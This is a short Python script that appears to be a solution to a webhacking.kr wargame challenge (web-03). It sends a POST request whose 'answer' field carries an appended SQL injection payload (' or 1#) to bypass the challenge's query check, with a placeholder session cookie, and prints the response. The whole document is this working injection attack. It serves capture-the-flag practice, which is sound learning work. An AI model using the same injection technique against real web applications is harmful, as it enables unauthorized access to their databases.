import requests
import time


URL = "https://webhacking.kr/challenge/web-03/"
SESSION_ID = "1234"
cookies = {'PHPSESSID':SESSION_ID}
params ={'answer':1010100000011100101011111}
data = {'answer':'1010100000011100101011111\' or 1#', 'id':'''0b100 '''}

response = requests.post(URL, data=data, params=params, cookies=cookies)
print(response.text)

